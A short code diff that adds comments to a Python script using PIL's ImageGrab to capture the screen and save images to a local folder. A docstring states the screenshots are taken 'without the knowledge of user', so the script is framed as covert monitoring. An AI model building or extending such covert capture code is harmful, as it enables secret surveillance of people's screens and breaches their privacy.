@@ -2,9 +2,14 @@ from PIL import ImageGrab
 import os
 import random
 
+#For naming convention random module is used
 rand=random.randint(10000,300000)
 
 def take_screenshot():
+    """""
+    This method will take screenshot without the knowledge of user
+    and save it in a "pics" folder
+    """""
     image= ImageGrab.grab()
     path='/home/sk84/PycharmProjects/scrrenshot_project/pics'
     try:
